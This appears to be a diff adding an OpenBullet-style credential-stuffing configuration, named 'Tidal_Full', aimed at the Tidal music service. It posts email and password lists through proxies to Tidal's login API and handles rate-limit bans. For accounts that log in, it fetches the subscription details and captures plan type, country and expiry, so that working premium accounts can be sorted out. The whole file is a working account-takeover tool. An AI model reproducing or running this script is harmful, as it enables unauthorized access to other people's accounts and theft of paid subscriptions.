@@ -1,0 +1,80 @@
+[SETTINGS]
+{
+  "Name": "Tidal_Full",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-09T18:22:25.3384238+02:00",
+  "AdditionalInfo": "",
+  "Author": "*_*",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#v1 REQUEST POST "https://api.tidalhifi.com/v1/login/username?token=wdgaB1CilGA-S_s2" AutoRedirect=FALSE 
+  CONTENT "username=<USER>&password=<PASS>&clientVersion=1.6.4" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://api.tidalhifi.com" 
+  HEADER "Host: api.tidalhifi.com" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"userId\"" 
+  KEYCHAIN Failure OR 
+    KEY "\"subStatus\":3001" 
+  KEYCHAIN Retry OR 
+    KEY "\"subStatus\":999" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "429" 
+
+#1 PARSE "<SOURCE>" LR "\"userId\":" "," -> VAR "id" 
+
+#2 PARSE "<SOURCE>" JSON "sessionId" -> VAR "session" 
+
+#3 PARSE "<SOURCE>" JSON "countryCode" -> CAP "Country" 
+
+#api REQUEST GET "https://api.tidalhifi.com/v1/users/<id>/subscription?sessionId=<session>&countryCode=<Country>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: api.tidalhifi.com" 
+  HEADER "Referer: https://api.tidalhifi.com" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"PREMIUM\"" 
+    KEY "\"HIFI\"" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "\"type\":\"FREE\"" 
+  KEYCHAIN Retry OR 
+    KEY "\"subStatus\":999" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "429" 
+
+PARSE "<SOURCE>" LR "type\":\"" "\"" -> CAP "Subscription" 
+
+PARSE "<SOURCE>" LR ":\"" "\"" -> CAP "Valid Until" 
+
+PARSE "<SOURCE>" LR "tus\":\"" "\"" -> CAP "Status" "" " " 
+
